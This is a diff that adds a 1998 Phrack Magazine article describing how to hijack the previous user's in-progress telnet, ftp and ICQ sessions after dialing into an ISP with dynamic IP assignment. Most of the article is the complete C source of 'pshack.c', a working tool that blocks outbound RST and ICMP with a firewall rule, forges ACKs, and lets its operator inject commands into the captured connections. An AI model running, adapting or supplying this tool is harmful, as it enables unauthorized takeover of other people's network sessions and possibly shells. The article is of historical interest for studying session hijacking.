@@ -1,0 +1,567 @@
+---[  Phrack Magazine   Volume 8, Issue 54 Dec 25th, 1998, article 07 of 12
+
+
+-------------------------[  Scavenging Connections On Dynamic-IP Networks
+
+
+--------[  Seth McGann <smm@wpi.edu> (www.el8.org) 11.29.98
+	
+
+
+----[  Purpose
+
+This paper will highlight a potentially serious loophole in networks that rely
+on dynamic IP assignment.  More specifically, dial-up dynamic IP assignment
+provided by almost every Internet Service Provider.  This problem will allow
+the unauthorized use of the previous host's connections, for instance, in
+progress telnet and ftp control sessions.  This issue is reminiscent of the
+problem where terminal servers would sometimes provide an already logged in
+session to a user lucky enough to call precisely after a forced disconnect due
+to line noise or other outside factor.
+
+
+----[  The Problem
+
+To perform this feat we rely on some well know concepts, usually employed for
+non-blind spoofing or session hijacking.  First, we have to understand what
+a connection looks like after an abrupt loss of service.  The key point is
+that the connection does not simply disappear, because there is no way for the
+disconnected host to notify the remote end that it has lost its link.  If the
+remote end tries to send more data and there is no host available, the upstream
+router will generate an ICMP unreachable and the connection will be terminated.
+If another dial-up user connects before the remote end has sent any more data
+the story is different.  For a TCP based connection, the kernel will see a
+packet going to an unconnected port, usually with PUSH and ACK set or simply
+ACK, and will generate a RST, ending the connection.  For an incident UDP
+packet, an ICMP unreachable is generated.  Either way the connection will
+evaporate.
+
+
+----[  The Solution
+
+Solving the problem is twofold.  We must first prevent the kernel from killing
+the connections and second we must make sure the remote end knows we are still
+alive, to prevent timeouts.  For UDP the answer is very simple.  As long as we
+block outbound ICMP unreachable packets the remote end won't disconnect.
+Application timeouts must be dealt with, of course.  For TCP we have a bigger
+problem, since the connections will die if not responded to.  To prevent our
+poisonous RST packets from reaching the remote side we simply block all
+outbound TCP traffic.  To keep the dialogue going, we simply ACK all incident
+PUSH|ACK packets and increment the ACK and SEQ numbers accordingly.  We
+recover data from packets with the PUSH flag set.  Additionally we can
+send data back down the connection by setting the PUSH and ACK flags on
+our outbound packets.
+
+
+----[  Implementation
+
+To stop our kernel from killing the latent connections, we first block all
+outbound traffic. Under linux a command such as the following would be
+effective:
+
+/sbin/ipfwadm -O -a deny -S 0.0.0.0/0  -P all -W ppp0
+
+Now, no RST packets or ICMP will get out.  We are essentially turning off
+kernel networking support and handling all the details ourselves.  This will
+not allow us to send using raw sockets, unfortunately.  SOCK_PACKET could
+be used, but in the interests of portability the firewall is simply opened
+to send a packet and then closed.  To be useful on a larger number of
+platforms, libpcap 0.4 was used for pulling packets off the wire and
+Libnet 0.8b was used for putting them back again.  The program itself is
+called pshack.c because that's basically all it does.  Additionally, it will
+allow you respond to in progress connections just in case you find a root
+shell.  It will also accept inbound connections, and allow you to reply to
+them.  Note, this will only work on Linux right now, due to the differences in
+handling of the firewall.  This is very minor and will be fixed soon.  It
+should compile without incident on RedHat 5.1 or 4.2 and on Slackware as well,
+given one change to the ip firewall header file, namely taking out the
+#include <linux/tcp.h> line.
+
+
+----[  Conclusions
+
+Using this program it is easy to scavenge telnet and ftp control sessions,
+or basically any low traffic, idle connection.  Grabbing ICQ sessions is a
+good example of a UDP based scavenge.  Obviously, streaming connections,
+such as ftp data will be ICMP to death before they can be scavenged.  It's
+interesting to note that hosts that drop ICMP unreachable packets, for fear
+of forged unreachable packets, are particularly vulnerable as they will not
+lose the connection as quickly.
+
+Required:
+
+libpcap 0.4  -> ftp://ftp.ee.lbl.gov/libpcap.tar.Z
+Libnet  0.8b -> http://www.infonexus.com/~daemon9/Projects/Libnet/
+
+<++> scavenge/pshack.c
+/* - PshAck.c - Attempts to scavenge connections when you dial up an ISP.
+ *   Author:    Seth McGann <smm@wpi.edu> / www.el8.org (Check papers section)
+ *   Date:      11/29/98
+ *   Greets:    dmess0r,napster,awr,all things w00w00,#203
+ *   Version:   0.3
+ *
+ *   Usage:
+ *              1.  Dial up your ISP and start pshack up.
+ *              2.  If you are lucky you will see connections you did not
+ *		    make :)
+ *              3.  Repeat the procedure.
+ *   Options:
+ *             -i: The interface
+ *             -l: Link offset
+ *             -s: Your source IP
+ *
+ *   Compiling: 'gcc pshack.c -o pshack -lnet -lpcap' should work given you have
+ *              libpcap and Libnet installed properly.
+ *
+ *              libpcap 0.4 : ftp://ftp.ee.lbl.gov/libpcap.tar.Z
+ *              Libnet  0.8b: http://www.infonexus.com/~daemon9/Projects/Libnet/
+ *
+ *   Have fun!
+ */
+
+#define __BSD_SOURCE
+#include <netinet/udp.h>
+#define __FAVOR_BSD
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <syslog.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <net/if.h>
+#include <libnet.h>
+#include <pcap.h>
+#include <netinet/ip_fw.h>
+#include <setjmp.h>
+
+/* #define DEBUGIT */
+
+#ifdef DEBUGIT
+#define DEFAULT_INTERFACE "eth1"
+#define DEFAULT_OFFSET    14
+#else
+#define DEFAULT_INTERFACE "ppp0"   /* Default is PPP with no linklayer */
+#define DEFAULT_OFFSET    0
+#endif
+
+struct conn {
+	u_int    type;
+	u_long   src,dst,seq,ack;
+	u_short  sport,dport;
+};
+
+void clean_exit(int);
+void time_out(int);
+void usage(char *);
+void dump_packet( u_char *, int );
+int update_db( u_char *, int, struct conn*);
+void dump_db (struct conn*);
+
+char errbuf[2000];
+sigjmp_buf env;
+
+
+
+int
+main (int argc, char **argv) {
+
+	struct ip     *ip_hdr;
+	struct tcphdr *tcp_hdr;
+	struct udphdr *udp_hdr;
+	struct ip_fw  fw;
+	struct ifreq  ifinfo;
+	struct pcap_pkthdr ph;
+	pcap_t        *pd;
+	u_long        local=0,seq,ack;
+	u_short	      flags=0;
+	u_char        *d_ptr,*packet;
+	u_char	      *pbuf=malloc(TCP_H+IP_H+500);
+	char 	      iface[17],sendbuf[500];
+	int           osock,sfd,linkoff,i,datalen,newsize,dbsize=0;
+	struct conn   conn[100];         /* WAY more than enough */
+	char arg;	
+        fd_set rfds;
+        struct timeval tv;
+        int retval;
+	char user[500];
+	
+	
+        strcpy(iface,DEFAULT_INTERFACE);
+        linkoff=DEFAULT_OFFSET;
+
+	while((arg = getopt(argc,argv,"i:s:l:")) != EOF){
+            switch(arg) {
+	          case 's':
+	          local=inet_addr(optarg);
+	          break;
+	          case 'i':
+	          strncpy(iface,optarg,16);
+	          break;
+	          case 'l':
+	          linkoff=atoi(optarg);
+	          break;
+	          default:
+	          usage(argv[0]);
+	          break;
+	     }
+        }
+
+	printf("* Blocking till %s comes up *\n",iface);
+	
+        do {pd=pcap_open_live(iface,1500,0,500,errbuf);}while(!pd);
+	
+	printf("* Configuring Raw Output *\n");
+	osock=open_raw_sock(IPPROTO_RAW);
+        if (osock<0)perror("socket()"),exit(1);
+	strcpy(ifinfo.ifr_ifrn.ifrn_name,iface);
+        if(ioctl(osock,SIOCGIFFLAGS,&ifinfo)<0)perror("ioctl()"),exit(1);
+        if(ioctl(osock,SIOCSIFFLAGS,&ifinfo)<0)perror("ioctl()"),exit(1);
+        if(ioctl(osock,SIOCGIFADDR,&ifinfo)<0)perror("ioctl()"),exit(1);
+	
+        bcopy(&ifinfo.ifr_addr.sa_data[2],&local,4);
+	printf("* Address: %s\n",host_lookup(local,0));
+
+        printf("* Blocking Outbound on %s *\n",iface);
+	sfd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
+        if(sfd<0) perror("socket()"),exit(1);
+
+	bzero(&fw,sizeof(fw));
+        strcpy(fw.fw_vianame,iface);
+        #ifdef DEBUGIT
+	fw.fw_flg=IP_FW_F_ICMP;
+        if(setsockopt(sfd,IPPROTO_IP,IP_FW_INSERT_OUT,&fw,sizeof(fw))<0)
+        perror("setsockopt()"),exit(1);
+	fw.fw_flg=IP_FW_F_TCP;
+        fw.fw_nsp=1;
+        fw.fw_pts[0]=666;
+        #endif
+        if(setsockopt(sfd,IPPROTO_IP,IP_FW_INSERT_OUT,&fw,sizeof(fw))<0)
+        perror("setsockopt()"),exit(1);
+
+	signal(SIGTERM,clean_exit);
+	signal(SIGINT,clean_exit);
+	signal(SIGALRM,time_out);	
+
+	printf("* Entering Capture Loop *\n\n");
+	printf("* Commands [1] Dump databese\n"
+	       "           [2] Send on connection <n> Ex: 2 1 ls -al\n"
+	       "           [3] Exit\n\n");
+	sigsetjmp(env,1);
+	
+	FD_ZERO(&rfds);
+        FD_SET(0, &rfds);
+        tv.tv_sec = 0;
+	tv.tv_usec = 0;
+
+        retval = select(1, &rfds, NULL, NULL, &tv);
+	
+	if (retval) {
+	   retval=read(1,user,sizeof(user));
+	   user[retval]=0;
+	   switch(user[0]) {
+             case '1':
+       	     dump_db(conn);
+             break;
+	     case '2':
+	     i=atoi(&user[2]);
+	     if (i > dbsize) {
+	         printf("* Invalid connection index) *\n");
+	         break;
+             }
+             build_ip(TCP_H,
+           	      101,
+		      0,
+           	      IP_DF,
+	       	      128,
+		      IPPROTO_TCP,
+		      local,
+         	      htonl(conn[i].src),
+	     	      NULL, 0, pbuf);
+	
+	     build_tcp(conn[i].dport,
+		       conn[i].sport,
+		       conn[i].seq,
+                       conn[i].ack,
+		       TH_PUSH|TH_ACK, 31000, 0,user+4,strlen(user+4),
+                           pbuf + IP_H);
+
+	     do_checksum(pbuf, IPPROTO_TCP, TCP_H+strlen(user+4));
+	     setsockopt(sfd,IPPROTO_IP,IP_FW_DELETE_OUT,&fw,sizeof(fw));
+	     write_ip(osock, pbuf, TCP_H + IP_H + strlen(user+4));
+             setsockopt(sfd,IPPROTO_IP,IP_FW_INSERT_OUT,&fw,sizeof(fw));
+
+ 	     printf("Sent: %s\n",user+4);
+             break;
+	     case '3':
+	     clean_exit(1);
+	     break;
+	     default:
+             break;
+           }
+	}
+	alarm(1);
+	
+	for(;packet=pcap_next(pd,&ph);) {
+	
+        ip_hdr = (struct ip *)(packet + linkoff);
+	
+	switch(ip_hdr->ip_p) {
+	
+	case IPPROTO_TCP:
+             tcp_hdr=(struct tcphdr*)(((char*)ip_hdr)+(4*ip_hdr->ip_hl));
+	     dump_packet(packet,linkoff);
+	     #ifdef DEBUGIT
+	     if ((ntohl(ip_hdr->ip_src.s_addr) != local) &&
+		 ntohs(tcp_hdr->th_dport)==666) {
+	     #else
+	     if (ntohl(ip_hdr->ip_src.s_addr) != local) {
+	     #endif
+	     newsize=update_db(packet, linkoff, conn);
+
+	     if(newsize>dbsize) {
+             printf("New Connect:\n");
+             dbsize=newsize;}
+
+	     if (tcp_hdr->th_flags&TH_PUSH || (tcp_hdr->th_flags&TH_SYN &&
+	 	 tcp_hdr->th_flags&TH_ACK)) {
+		 datalen=ntohs(ip_hdr->ip_len)-IP_H-TCP_H;
+		 if(!datalen) datalen++;
+
+	         seq=ntohl(tcp_hdr->th_ack);
+		 ack=ntohl(tcp_hdr->th_seq)+datalen;
+		 flags=TH_ACK;
+  		 } else if(tcp_hdr->th_flags&TH_SYN) {
+		 seq=get_prand(PRu32);
+		 ack=ntohl(tcp_hdr->th_seq)+1;
+		 flags=TH_SYN|TH_ACK;
+	      	 }
+
+	         if(flags) {
+                 build_ip(TCP_H,
+			  101,
+			  0,
+		 	  IP_DF,
+	       		  128,
+			  IPPROTO_TCP,
+			  local,
+                          ip_hdr->ip_src.s_addr,
+			  NULL, 0, pbuf);
+	
+		 build_tcp(ntohs(tcp_hdr->th_dport),
+		           ntohs(tcp_hdr->th_sport),
+		           seq,
+                           ack,
+		           flags, 31000, 0, NULL, 0, pbuf + IP_H);
+
+		 do_checksum(pbuf, IPPROTO_TCP, TCP_H);
+		 setsockopt(sfd,IPPROTO_IP,IP_FW_DELETE_OUT,&fw,sizeof(fw));
+                 write_ip(osock, pbuf, TCP_H + IP_H);
+                 setsockopt(sfd,IPPROTO_IP,IP_FW_INSERT_OUT,&fw,sizeof(fw));
+		 flags=0; }
+	     }
+	     break;
+	
+	case IPPROTO_UDP:
+	     dump_packet(packet,linkoff);
+	     break;
+	default:
+	break;
+	    }
+	  }
+
+}
+
+
+void
+dump_packet( u_char *packet, int linkoff ) {
+
+	struct ip     *ip_hdr;
+	struct tcphdr *tcp_hdr;
+	struct udphdr *udp_hdr;
+	u_char        *d_ptr;
+	u_int         i;
+
+	ip_hdr = (struct ip *)(packet + linkoff);
+	
+	switch (ip_hdr->ip_p) {
+	
+	case IPPROTO_TCP:
+	tcp_hdr=(struct tcphdr*)(((char*)ip_hdr)+(4*ip_hdr->ip_hl));
+	
+	printf("********************\n");
+	printf("TCP: %s.%d->%s.%d SEQ: %u ACK: %u\n "
+	       "Flags: %c%c%c%c%c%c Data Len: %d\n",
+		host_lookup(ip_hdr->ip_src.s_addr,0),
+		ntohs(tcp_hdr->th_sport),
+		host_lookup(ip_hdr->ip_dst.s_addr,0),
+		ntohs(tcp_hdr->th_dport),
+	        ntohl(tcp_hdr->th_seq),
+	        ntohl(tcp_hdr->th_ack),	
+	        (tcp_hdr->th_flags & TH_URG)  ? 'U' : '-',
+                (tcp_hdr->th_flags & TH_ACK)  ? 'A' : '-',
+                (tcp_hdr->th_flags & TH_PUSH) ? 'P' : '-',
+                (tcp_hdr->th_flags & TH_RST)  ? 'R' : '-',
+                (tcp_hdr->th_flags & TH_SYN)  ? 'S' : '-',
+                (tcp_hdr->th_flags & TH_FIN)  ? 'F' : '-',
+                ntohs(ip_hdr->ip_len)-IP_H-TCP_H);
+	
+		d_ptr=packet+linkoff+TCP_H+IP_H;
+
+                for(i=0;i<(ntohs(ip_hdr->ip_len)-IP_H-TCP_H);i++)
+                   if (d_ptr[i]=='\n')
+		      printf("\n");
+                   else if (d_ptr[i]>0x1F && d_ptr[i]<0x7F)
+		           printf("%c",d_ptr[i]);
+                        else
+                           printf (".");
+
+		printf("\n");
+		break;
+
+	case IPPROTO_UDP:
+
+	udp_hdr=(struct udphdr*)(((char*)ip_hdr) + (4 * ip_hdr->ip_hl));
+	printf("********************\n");
+	printf("UDP: %s.%d->%s.%d Data Len: %d\n",
+               host_lookup(ip_hdr->ip_src.s_addr,0),
+               ntohs(udp_hdr->uh_sport),
+               host_lookup(ip_hdr->ip_dst.s_addr,0),
+               ntohs(udp_hdr->uh_dport),
+	       ntohs(ip_hdr->ip_len)-IP_H-UDP_H);
+
+	d_ptr=packet+linkoff+UDP_H+IP_H;
+        for(i=0;i<(ntohs(udp_hdr->uh_ulen)-UDP_H);i++)
+            if (d_ptr[i]=='\n')
+               printf("\n");
+            else if (d_ptr[i]>0x19 && d_ptr[i]<0x7F)
+                    printf("%c",d_ptr[i]);
+                 else
+		    printf(".");
+	
+	printf("\n");
+	break;
+
+ 	default:
+	/* We ignore everything else */
+	break;
+	}
+	
+}
+
+void
+clean_exit(int val) {
+
+	int sfd,p=0;
+
+        sfd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
+        if (sfd<0) perror("socket()"),exit(1);
+        if(setsockopt(sfd,IPPROTO_IP,IP_FW_FLUSH_OUT,&p,sizeof(p))<0)
+        perror("setsockopt()"),exit(1);
+        exit(0);
+}
+
+
+void
+usage(char *arg) {
+       	printf("%s: [options]\n"
+               "  -i: The interface\n"
+	       "  -l: Link offset\n"
+               "  -s: Your source IP\n\n",arg);
+        exit(0);
+}
+
+void
+dump_db (struct conn *conn) {
+
+	int i;
+	
+
+	for(i=0;conn[i].type;i++)
+	   if(conn[i].type==IPPROTO_TCP)
+	   printf("%d: TCP: %s.%d->%s.%d SEQ: %u ACK: %u\n",
+	           i, host_lookup(htonl(conn[i].src),0),conn[i].sport,
+	           host_lookup(htonl(conn[i].dst),0), conn[i].dport,
+	           conn[i].seq,conn[i].ack);
+	   else if(conn[i].type==IPPROTO_UDP)
+	   printf("%d: UDP: %s.%d->%s.%d\n",
+	           i, host_lookup(htonl(conn[i].src),0),conn[i].sport,
+	           host_lookup(htonl(conn[i].dst),0), conn[i].dport);
+	  else break;
+
+
+}
+
+
+int
+update_db( u_char *packet, int linkoff, struct conn *conn) {
+	struct ip     *ip_hdr;
+	struct tcphdr *tcp_hdr;
+	struct udphdr *udp_hdr;
+	int i=0;
+	ip_hdr = (struct ip *)(packet + linkoff);
+
+	switch(ip_hdr->ip_p) {
+
+	case IPPROTO_TCP:
+	tcp_hdr=(struct tcphdr*)(((char*)ip_hdr)+(4*ip_hdr->ip_hl));
+
+	for(i=0;conn[i].type;i++)
+	   if(conn[i].type==IPPROTO_TCP)
+	    if(ip_hdr->ip_src.s_addr==htonl(conn[i].src))
+             if(ip_hdr->ip_dst.s_addr==htonl(conn[i].dst))
+	      if(ntohs(tcp_hdr->th_sport)==conn[i].sport)
+	       if(ntohs(tcp_hdr->th_dport)==conn[i].dport)
+                    break;
+
+	if(conn[i].type) {
+          conn[i].seq=ntohl(tcp_hdr->th_ack);
+	  conn[i].ack=ntohl(tcp_hdr->th_seq); }
+        else {
+	  conn[i].type=IPPROTO_TCP;
+	  conn[i].src=ntohl(ip_hdr->ip_src.s_addr);
+	  conn[i].dst=ntohl(ip_hdr->ip_dst.s_addr);
+	  conn[i].sport=ntohs(tcp_hdr->th_sport);
+	  conn[i].dport=ntohs(tcp_hdr->th_dport);
+          conn[i].seq=ntohl(tcp_hdr->th_ack);
+	  conn[i].ack=ntohl(tcp_hdr->th_seq); }		
+
+	break;
+
+	case IPPROTO_UDP:
+	udp_hdr=(struct udphdr*)(((char*)ip_hdr)+(4*ip_hdr->ip_hl));
+
+	for(i=0;conn[i].type;i++)
+          if(conn[i].type==IPPROTO_TCP)
+	    if(ntohl(ip_hdr->ip_src.s_addr)==conn[i].src)
+       	     if(ntohl(ip_hdr->ip_dst.s_addr)==conn[i].dst)
+	       if(ntohs(udp_hdr->uh_sport)==conn[i].sport)
+	         if(ntohs(udp_hdr->uh_dport)==conn[i].dport) break;
+
+	if(!conn[i].type) {
+	  conn[i].type=IPPROTO_UDP;
+	  conn[i].src=ntohl(ip_hdr->ip_src.s_addr);
+	  conn[i].dst=ntohl(ip_hdr->ip_dst.s_addr);
+	  conn[i].sport=ntohs(udp_hdr->uh_sport);
+	  conn[i].dport=ntohs(udp_hdr->uh_dport); }
+
+	break;
+	default:
+	/* We Don't care */
+	break;
+      }
+      return i;
+
+}
+
+void
+time_out(int blank) {
+alarm(0);
+siglongjmp(env,1);
+}
+
+/* EOF */
+<-->
+
+----[  EOF
